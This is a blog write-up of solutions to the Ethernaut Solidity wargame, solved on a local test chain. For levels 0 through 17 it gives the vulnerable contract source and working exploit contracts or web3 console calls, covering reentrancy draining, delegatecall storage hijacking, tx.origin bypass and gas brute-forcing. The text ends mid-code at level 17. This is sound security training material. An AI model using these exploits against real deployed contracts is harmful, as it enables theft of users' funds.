+++
title = "Ethernaut Challenges writeup"
description = "Writeups for ethernaut challenges"
date = 2022-03-21T14:01:31+05:30
featured = true
draft = false
comment = false
toc = true
reward = false
categories = [
  "ctf",
]
tags = [
  "ctfs",
  "blockchain",
  "ethereum",
  "evm",
  "writeups"
]
series = []
images = ["images/ethernaut_logo.png"]
+++

&nbsp;&nbsp;&nbsp;&nbsp;Hey there! I have started learning blockchain security related stuff. I solved some challenges from [Ethernaut CTF](https://ethernaut.openzeppelin.com/) and here is a writeup about my local ethernaut setup and brief explanation of solutions to the challenges.

<!--more-->

&nbsp;&nbsp;&nbsp;&nbsp;Ethernaut is a Web3/Solidity based wargame played in Ethereum Virtual Machine (EVM). Each level is a smart contract that needs to be 'hacked'. My friend [@S3v3ru5_](https://twitter.com/S3v3ru5_) suggested me to solve these challenges to learn about basic bugs in solidity.

&nbsp;&nbsp;&nbsp;&nbsp;I have read [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook) book and a [blog series](https://blog.trustlook.com/understand-evm-bytecode-part-1/) about EVM bytecode and how solidity uses EVM storage. They made some challenges easier for me, so I recommend you to read them before getting started with the CTF.

&nbsp;&nbsp;&nbsp;&nbsp;Without further ado, let's get to local ethernaut setup and solutions for the challenges. For setting up ethernaut locally, you can follow the steps in its [github page](https://github.com/OpenZeppelin/ethernaut). I tried to use Node.js v16, but it raised some errors due to explicit json import assertions. You can use Node.js v14 for error-free setup. Metamask browser extension should be installed and localhost network should be selected. After running hardhat node in ethernaut, it prints some set of private keys. Choose any one private key and import it into metamask wallet. After the setup, you can access ethernaut website from [localhost:3000](http://localhost:3000/). Then open the console and you will have access to contract and web3js library, which you can use to interact with the contract.

## Solutions:

### 0. Hello Ethernaut
For this challenge, source code is not provided beforehand. You can click `Get new instance` and you will be given the TruffleContract object of the challenge contract in contract variable. Use `await contract.info();` and follow the responses to clear the level. After following all the steps, click `Submit instance` to evaluate whether the challenge is solved or not.

**Challenge Source:** [0_hello_ethernaut.sol](files/challenge_contracts/0_hello_ethernaut.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
```
> **Solution:**  
> ```js
> await contract.info();
> await contract.info1();
> await contract.info2('hello');
> await contract.infoNum();
> await contract.info42();
> await contract.theMethodName();
> await contract.method7123949();
> await contract.authenticate(await contract.password());
> ```

### 1. Fallback
**Challenge Source:** [1_fallback.sol](files/challenge_contracts/1_fallback.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
> **Solution:**  
> * Our goal is to claim ownership of the contract and to reduce its balance to 0. To do that, we have to call the fallback function receive(), where the owner is set to msg.sender.  
> * To pass the require check in receive function, we have to contribute some ether to the contract using the contribute() function and then call the contract with empty data field to trigger receive function.
> * To reduce the balance to 0, we simply have to call `withdraw()` function and it will transfer all the amount to our account.
> ```js
> await web3.eth.sendTransaction({
>   from: player,
>   to: contract.address,
>   data: web3.eth.abi.encodeFunctionSignature('contribute()'),
>   value: 10**14
> });
> await web3.eth.sendTransaction({
>   from: player,
>   to: contract.address,
>   data: '',
>   value: 10**10
> });
> await contract.withdraw();
> ```

### 2. Fallout
**Challenge Source:** [2_fallout.sol](files/challenge_contracts/2_fallout.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
> **Solution:**  
> * The function named `Fal1out()` is supposed to be `Fallout()` which is same as the contract name. It used to be the syntax for defining constructor in older versions of solidity. Since the constructor can only be called by the contract creator, it is generally used to set the owner of the contract as msg.sender.  
> * Since it is misspelled, we can call that function like any other normal function and make ourselves as the owner of the contract.  
> ```js
> await contract.Fal1out();
> ```

### 3. Coin Flip
**Challenge Source:** [3_coin_flip.sol](files/challenge_contracts/3_coin_flip.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
> **Solution:**  
> * The goal is to make consecutiveWins variable to reach 10. We can use another exploit contract that calculates the blockValue itself and sends the value to the challenge contract.  
> * Since lastHash should not be equal to blockValue, we have to send 10 individual transactions (such that they go into 10 different blocks).  
> * We can use remix to connect to injected web3 environment and deploy the exploit contract [3_coin_flip_attack.sol](files/solution_contracts/3_coin_flip_attack.sol).
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/SafeMath.sol"; 
> 
> contract CoinFlipAttack {
>   using SafeMath for uint256;
>   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
>   event Response(bool success, bytes data, uint256 xxx);
> 
>   function attack(address _contract) public returns (bool) {
>     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
>     uint256 coinFlip = blockValue.div(FACTOR);
>     bool side = coinFlip == 1 ? true : false;
>     (bool success, bytes memory data) = _contract.call(abi.encodeWithSignature("flip(bool)", side));
>     emit Response(success, data, 1234);
>   }
> }
> ```
> * Deploy the exploit contract and call the attack function 10 times with the _contract parameter set to challenge contract address in order to complete this level.

### 4. Telephone
**Challenge Source:** [4_telephone.sol](files/challenge_contracts/4_telephone.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
> **Solution:**  
> * The goal of this challenge is to show the difference between tx.origin and msg.sender variables.  
> * The msg.sender variable contains the address of EOA or the contract that has directly called this contract. The tx.origin variable contains the address of EOA that initiated this transaction.  
> * So, if we create an exploit contract [4_telephone_attack.sol](files/solution_contracts/4_telephone_attack.sol) that calls this challenge contract, then the msg.sender in the challenge contract is set to address of exploit contract, while the tx.origin is set to the address of the initiator of the transaction, which is our EOA address.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract TelephoneAttack {
>   function attack(address _contract) public returns (bool) {
>     (bool success, ) = _contract.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
>     return success;
>   }
> }
> ```
> * Deploy this contract and call the attack function with _contract parameter set to challenge contract address to complete this challenge.

### 5. Token
**Challenge Source:** [5_token.sol](files/challenge_contracts/5_token.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
> **Solution:**  
> * We will be given 20 tokens initially. Our goal is to get more tokens.  
> * There is an integer underflow bug in the transfer function. Since SafeMath library is not used here, we can exploit this bug to bypass the balance check and get ourselves more tokens. 
> * If we set _value parameter to some number greater than 20 (for example, 21), balances\[msg.sender\] - 21 = -1, which will be 2\*\*256 - 1, since the datatype of balance is uint256. So, the require check is bypassed and our balance will become 2\*\*256 - 1.  
> ```js
> await contract.transfer('0x0000000000000000000000000000000000000000', 21);
> ```

### 6. Delegation
**Challenge Source:** [6_delegation.sol](files/challenge_contracts/6_delegation.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```
> **Solution:**  
> * Our goal is to become the owner of the challenge contract.  
> * The challenge contract uses delegatecall to another contract `Delegate`.  
> * DelegateCall function is used to call other smart contracts within the context of the current contract. So, the code in the delegatecalled contract uses the msg.sender, msg.value and storage of the current contract.  
> * Since solidity compiler stores the state variables in the order they were declared, if we edit the owner variable in Delegate contract, the owner variable in the Delegation contract will be updated, making us the owner of Delegation contract.
> ```js
> await web3.eth.sendTransaction({
>   from: player,
>   to: contract.address,
>   data: web3.eth.abi.encodeFunctionSignature('pwn()')
> });
> ```

### 7. Force
**Challenge Source:** [7_force.sol](files/challenge_contracts/7_force.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
> **Solution:**  
> * Our goal is to make the balance of the contract greater than 0.  
> * Since there are no payable fallback or receive functions implemented in the contract, it reverts any call it gets. So it is not possible to directly send ether to such contract.  
> * There are 2 ways we can send ether to such contracts:
>   1. We can send ether to the address of the contract before it is deployed. We can calculate its address beforehand based on the address of the contract creator and its nonce.  
>   2. We can create a contract that uses selfdestruct function that sends its ether to this contract.  
> * Since the contract is already deployed, we can only use the 2nd method to send ether to the challenge contract.  
> * Deploy the exploit contract [7_force_attack.sol](files/solution_contracts/7_force_attack.sol) with some ether and call attack function with _contract parameter set to challenge contract address to complete this challenge.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract ForceAttack {
>     constructor () public payable {}
>     function attack(address payable _contract) public {
>         selfdestruct(_contract);
>     }
> }
> ```

### 8. Vault
**Challenge Source:** [8_vault.sol](files/challenge_contracts/8_vault.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
> **Solution:**  
> * Our goal is to unlock the vault, i.e., to change the locked variable to false.
> * We can do that by calling the unlock function with password as argument. Though the password variable is set to private, it only limits access to that variable for other derived contracts (refer to [Solidity Documentation](https://docs.soliditylang.org/en/v0.4.24/contracts.html#visibility-and-getters)).  
> * The storage of a contract is public and can be read by anyone. So one should not directly store sensitive information on in an account's storage.
> * We can read the storage of the contract using web3js library and pass it to the unlock function to complete this challenge.
> ```js
> await contract.unlock(await web3.eth.getStorageAt(contract.address, 1));
> ```

### 9. King
**Challenge Source:** [9_king.sol](files/challenge_contracts/9_king.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```
> **Solution:**  
> * Our goal is to become the king of the contract and not let anyone else to overthrow us.  
> * To not let others overthrow us from the throne, we have to make `king.transfer(msg.value)` revert somehow, so that king will not be set to msg.sender.  
> * To do that, first we have to make our exploit contract as the king of the challenge contract. If we don't define payable fallback or receive functions in our contract, it reverts by default.  
> * Deploy the exploit contract [9_king_attack.sol](files/solution_contracts/9_king_attack.sol) and call the attack function with _contract parameter set to challenge contract with ether greater than current prize to complete the challenge.  
> * To get the current prize, we can call `(await contract.prize()).toString();`
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract KingAttack {
>     event Response(int x);
> 
>     function attack(address payable _contract) public payable {
>         (bool result, ) = _contract.call.value(msg.value)("");
>         if (result) {
>             emit Response(1234);
>         } else {
>             emit Response(5678);
>         }
>     }
> }
> ```

### 10. Re-entrancy
**Challenge Source:** [10_reentrancy.sol](files/challenge_contracts/10_reentrancy.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
> **Solution:**  
> * Our goal is to steal all the funds from the challenge contract.
> * In withdraw function, the amount is sent to msg.sender, but instead of using send or transfer function, it uses call function. This introduces unnecessary complication that leads to re-entrancy bug.
> * If the msg.sender is a contract, the call can trigger a function in that contract which inturn calls withdraw() function leading to recursive calls.
> * In our exploit contract, first we have to donate some amount (lets say, 1000000000000000) and then call the withdraw. Since balances\[msg.sender\] is subtracted AFTER the recursive call ends, we can withdraw more amount than our balance.
> * Deploy the exploit contract [10_reentrancy_attack.sol](files/solution_contracts/10_reentrancy_attack.sol) and call the attack function with _contract parameter set to challenge contract address and ether equal to the amount we donated, to complete the challenge.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract ReentranctAttack {
>     event Response(uint x);
>     uint256 attacker_bal;
> 
>     function attack(address payable _contract) public payable {
>         attacker_bal = msg.value;
>         (bool result1, ) = _contract.call.value(attacker_bal)(abi.encodeWithSignature("donate(address)", address(this)));
>         if (!result1) { emit Response(1111); }
>         (bool result2, ) = _contract.call(abi.encodeWithSignature("withdraw(uint256)", attacker_bal));
>         if (!result2) { emit Response(2222); }
>     }
> 
>     receive() external payable {
>         uint256 bal = msg.sender.balance;
>         if (bal > 0) {
>             if (bal < attacker_bal) attacker_bal = bal;
>             (bool result, ) = msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", attacker_bal));
>             if (!result) { emit Response(3333); }
>         } else {
>             emit Response(4444);
>         }
>     }
> }
> ```

### 11. Elevator
**Challenge Source:** [11_elevator.sol](files/challenge_contracts/11_elevator.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
> **Solution:**  
> * Our goal is to make the value of top variable to true.
> * The contract is assuming that msg.sender has code that implements the `Building` interface and calls the isLastFloor function. In order to set top variable to true, we have to make isLastFloor return false for first function call and true for second function call.
> * To do that, we can have a flag variable in our contract which acts like a toggle.
> * Deploy the exploit contract [11_elevator_attack.sol](files/solution_contracts/11_elevator_attack.sol) and call the attack function with _contract parameter set to challenge contract address to complete the challenge.
> ```sol
> pragma solidity ^0.6.0;
> 
> contract ElevatorAttack {
>     bool flag = true;
>     event Response(uint x);
> 
>     function attack(address _contract) public {
>         (bool result, ) = _contract.call(abi.encodeWithSignature("goTo(uint256)", 1));
>         if (result) { emit Response(1111); }
>         else { emit Response(2222); }
>     }
> 
>     function isLastFloor(uint) external returns (bool) {
>         flag = !flag;
>         return flag;
>     }
> }
> ```

### 12. Privacy
**Challenge Source:** [12_privacy.sol](files/challenge_contracts/12_privacy.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
> **Solution:**  
> * Our goal is to unlock the contract, i.e., to set the value of locked variable to false.
> * We can do that by sending the key, that is equal to the most significant (right most) 16 bytes stored at index 2 of data variable.
> * Since the storage of a contract is public, we can read the storage and find the key.
> * Solidity stores state variables in storage based on the order of their declaration and number of bytes occupied by that datatype. For example, in the given contract,
>   * locked variable is stored at storage\[0\].
>   * ID variable is stored at storage\[1\], since it requires 32 bytes and cannot be fit in storage\[0\].
>   * flattening, denomination and awkwardness variables are stored in storage\[2\] since they require 8, 8 and 16 bytes, which is 32 bytes combined, which can fit in one slot.
>   * data variable is stored at storage\[3\], storage\[4\] and storage\[5\].
> * So the key is the right most 16 bytes of storage\[5\]. We pass it to the unlock function to complete the challenge.
> ```js
> await contract.unlock((await web3.eth.getStorageAt(contract.address, 5)).substr(0, 34));
> ```

### 13. Gatekeeper One
**Challenge Source:** [13_gatekeeper_one.sol](files/challenge_contracts/13_gatekeeper_one.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
> **Solution:**  
> * Our goal is to pass all the checks in gateOne, gateTwo and gateThree and make ourselves as the entrant.
> * The check at first gate is that, msg.sender should not be equal to tx.origin, which can be easily passed by sending the transaction through an exploit contract, rather than sending it directly from our EOA.
> * The check at second gate is that, the gasleft at the time of executing that particular opcode should be divisible by 8191 (gasleft() % 8191 == 0). We can bruteforce the gas by setting it to 25000 + i, where i iterates from 0 to 8191. The check will be bypassed in one of those iterations.
> * There is also another way to pass this check. We can deploy the contract in Javascript VM in remix and use debugger to check the gas left at that opcode and send the amount of gas accordingly.
> * The third gate has 3 checks.
>   * The value of last 32 bits should be equal to value of last 16 bits. We can pass this by sending 0x0000abcd.
>   * The value of last 32 bits should not be equal to value of last 64 bits. That means there should be a non-zero bit to the left of the 32 bits. We can pass this by sending 0x10000abcd.
>   * The value of last 32 bits should be equal to value of last 16 bits of the tx.origin address. We can pass this check by sending the last 2 bytes of the address as the last 2 bytes in _gateKey.
> * Deploy the exploit contract [13_gatekeeper_one_attack.sol](files/solution_contracts/13_gatekeeper_one_attack.sol) and call the attack function with _contract parameter set to challenge address to complete the challenge.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
>
> contract GateKeeperOneAttack {
>     function attack(address _contract) public {
>         uint64 key = 0;
>         key = key ^ uint16(tx.origin);
>         key = key ^ (1 << 32);
>         for (uint i = 0; i < 8191; i++) {
>             (bool x, ) = _contract.call.gas(25000 + i)(abi.encodeWithSignature("enter(bytes8)", key));
>             if (x) {
>                 break;
>             }
>         }
>     }
> }
> ```

### 14. Gatekeeper Two
**Challenge Source:** [14_gatekeeper_two.sol](files/challenge_contracts/14_gatekeeper_two.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
> **Solution:**  
> * Our goal is to pass the checks at the three gate functions and become the entrant of the contract.
> * The check at first gate is that, the msg.sender should not be equal to tx.origin, which can be easily passed by sending the transaction through an exploit contract, rather than sending it directly from our EOA.
> * The check at second gate is that, the length of the code at msg.sender address should be 0. Since we are bound to send the transaction through a contract in order to pass the first check, the code at the msg.sender address will be non-empty value.
> * But if it is called from the constructor of the exploit contract, the length of the code will be 0, because the runtime code will not be copied to the code section of the address until the execution of the constructor is over.
> * The check at third gate can be bypassed by calculating the _gateKey ourselves using the XOR operation (see the below exploit contract).
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> contract GateKeeperTwoAttack {
>     event Response(uint x);
> 
>     constructor(address _contract) public {
>         bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
>         (bool result, ) = _contract.call(abi.encodeWithSignature("enter(bytes8)", payload));
>         if (result) {
>             emit Response(1111);
>         } else {
>             emit Response(2222);
>         }
>     }
> }
> ```

### 15. Naught Coin
**Challenge Source:** [15_naughtcoin.sol](files/challenge_contracts/15_naughtcoin.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```
> **Solution:**  
> * Our goal is to transfer the tokens out of our account and get our balance to 0.
> * The timelock is set, so that we cannot directly transfer funds from our account for the next 10 years.
> * But there is a functionality in ERC20 token standard that allows a user to give some of his tokens as allowance to other users, so that they can spend that allowance without this user's consent.
> * Here, since the funds are in our account, we can give allowance to another account and then use the transferFrom function to transfer the tokens to another account.
> ```js
> player = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8';
> helper_account = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
> balance = '0xd3c21bcecceda1000000';
> await contract.approve(helper_account, balance);
> ```
> * Now call the transferFrom function from the helper account, with from parameter set to player address, to parameter set to any address and amount set to the balance amount to solve this challenge.

### 16. Preservation
**Challenge Source:** [16_preservation.sol](files/challenge_contracts/16_preservation.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
> **Solution:**  
> * Our goal is to claim ownership of the given contract.
> * We can use the setFirstTime function to set the timeZone1Library variable value to our exploit contract address. Since it is using delegatecall, the LibraryContract will use the storage of the Preservation contract and updates the first address, i.e., timeZone1Library.
> * And then we can call the setFirstTime, and set the 3rd slot in our storage to our address, which is the owner in Preservation contract.
> * Deploy the exploit contract [16_preservation_attack.sol](files/solution_contracts/16_preservation_attack.sol) and run the below js code to complete this challenge.
> ```sol
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
>
> contract PreservationAttack {
>     address x1;
>     address x2;
>     address owner;
> 
>     function setTime(uint _time) public {
>         owner = address(_time);
>     }
> }
> ```
> ```js
> await contract.setFirstTime(exploit_contract_address);
> await contract.setFirstTime(player);
> ```

### 17. Recovery
**Challenge Source:** [17_recovery.sol](files/challenge_contracts/17_recovery.sol)
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```
> **Solution:**  
> * Our goal is to recover or remove the balance from the lost SimpleToken contract that was created by the Recovery contract.
> * The challenge here is to calculate the address of the lost contract. Since the lost SimpleToken contract is created by the Recovery contract, we can calculate the address of the lost contract based on the address and nonce of the Recovery contract.
> * Since, the lost contract is the first contract created by the challenge contract, its nonce will be 1 (nonce is incremented before the address calculation).
> * Use nodejs and install rlp and keccak packages and run the following code to calculate the lost contract address.
> ```js
> const rlp = require('rlp');
> const keccak = require('keccak');
> calc_address = (sender, nonce) => {
>   var input_arr = [ sender, nonce ];
>   var rlp_encoded = rlp.encode(input_arr);
>   var contract_address_long = keccak('keccak256').update(rlp_encoded).digest('hex');
>   var contract_address = contract_address_long.substring(24);
>   return '0x' + contract_address;
> }
> lost_contract_address = calc_address(player, 1);
> ```
> * Now use the following code to call the destroy function in the lost contract to complete the challenge.
> ```js
> await web3.eth.sendTransaction({
>   from: player,
>   to: lost_contract_address,
